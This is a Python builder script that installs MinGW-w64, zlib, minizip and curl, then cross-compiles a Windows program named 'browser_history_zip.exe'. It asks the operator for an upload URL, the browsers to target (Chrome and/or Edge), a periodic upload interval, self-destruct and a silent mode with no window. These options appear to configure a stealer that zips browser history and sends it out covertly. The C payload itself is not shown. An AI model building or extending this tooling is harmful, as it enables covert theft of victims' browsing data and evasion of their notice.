import subprocess
import os
import sys

def check_mingw():
    """Check if MinGW-w64 is installed."""
    try:
        result = subprocess.run(["x86_64-w64-mingw32-gcc", "--version"], capture_output=True, text=True)
        if result.returncode == 0:
            print("MinGW-w64 found.")
            return True
        return False
    except FileNotFoundError:
        return False

def install_dependencies():
    """Install required packages on Linux."""
    print("Installing dependencies...")
    try:
        subprocess.run(["sudo", "apt", "update"], check=True)
        subprocess.run(["sudo", "apt", "install", "-y", "mingw-w64", "zlib1g-dev", "libcurl4-openssl-dev"], check=True)
        
        # Install minizip
        if not os.path.exists("/usr/x86_64-w64-mingw32/include/zip.h"):
            print("Installing minizip...")
            subprocess.run(["git", "clone", "https://github.com/madler/zlib.git", "/tmp/zlib"], check=True)
            subprocess.run(["make", "-C", "/tmp/zlib/contrib/minizip", "-f", "Makefile.mingw"], check=True)
            subprocess.run(["sudo", "cp", "/tmp/zlib/contrib/minizip/zip.h", "/usr/x86_64-w64-mingw32/include/"], check=True)
            subprocess.run(["sudo", "cp", "/tmp/zlib/contrib/minizip/libminizip.a", "/usr/x86_64-w64-mingw32/lib/"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to install dependencies: {e}")
        sys.exit(1)

def get_user_config():
    """Prompt user for configuration."""
    print("Configure the program:")
    
    # Upload URL
    upload_url = input("Enter upload URL (e.g., http://example.com/upload): ").strip()
    if not upload_url:
        upload_url = "http://example.com/upload"
    
    # Target browser
    print("Select target browser:")
    print("0: Chrome only")
    print("1: Edge only")
    print("2: Both Chrome and Edge")
    target = input("Enter choice (0-2): ").strip()
    while target not in ["0", "1", "2"]:
        print("Invalid choice. Please enter 0, 1, or 2.")
        target = input("Enter choice (0-2): ").strip()
    target = int(target)
    
    # Upload interval
    interval = input("Enter upload interval in hours (0 for one-time): ").strip()
    try:
        interval = int(interval)
        if interval < 0:
            raise ValueError
    except ValueError:
        print("Invalid interval. Using 0 (one-time).")
        interval = 0
    
    # Self-destruct
    self_destruct = input("Enable self-destruct? (y/n): ").strip().lower() == 'y'
    
    # Console or silent
    silent = input("Run silently (no console window)? (y/n): ").strip().lower() == 'y'
    
    return {
        "upload_url": upload_url,
        "target_browser": target,
        "upload_interval_hours": interval,
        "self_destruct": 1 if self_destruct else 0,
        "silent": silent
    }

def generate_config_h(config):
    """Generate config.h based on user input."""
    config_content = f"""#ifndef CONFIG_H
#define CONFIG_H

#define UPLOAD_URL "{config['upload_url']}"
#define TARGET_BROWSER {config['target_browser']}
#define UPLOAD_INTERVAL_HOURS {config['upload_interval_hours']}
#define SELF_DESTRUCT {config['self_destruct']}
{'#define SILENT' if config['silent'] else ''}

#endif
"""
    with open("config.h", "w") as f:
        f.write(config_content)
    print("Generated config.h")

def compile_program(silent):
    """Compile the C program."""
    source_file = "browser_history.c"
    output_file = "browser_history_zip.exe"
    
    if not os.path.exists(source_file):
        print(f"Source file {source_file} not found.")
        sys.exit(1)

    print(f"Compiling {source_file}...")
    cmd = [
        "x86_64-w64-mingw32-gcc",
        source_file,
        "-o", output_file,
        "-lshlwapi", "-lshell32", "-lz", "-lminizip", "-lcurl",
        "-DUNICODE", "-D_UNICODE"
    ]
    
    if silent:
        cmd.append("-mwindows")  # Windowless (GUI) subsystem
    
    try:
        subprocess.run(cmd, check=True)
        print(f"Compilation successful: {output_file}")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e}")
        sys.exit(1)

def main():
    if not check_mingw():
        print("MinGW-w64 not found. Please install it (e.g., 'sudo apt install mingw-w64' on Ubuntu).")
        sys.exit(1)
    
    install_dependencies()
    config = get_user_config()
    generate_config_h(config)
    compile_program(config["silent"])

if __name__ == "__main__":
    main()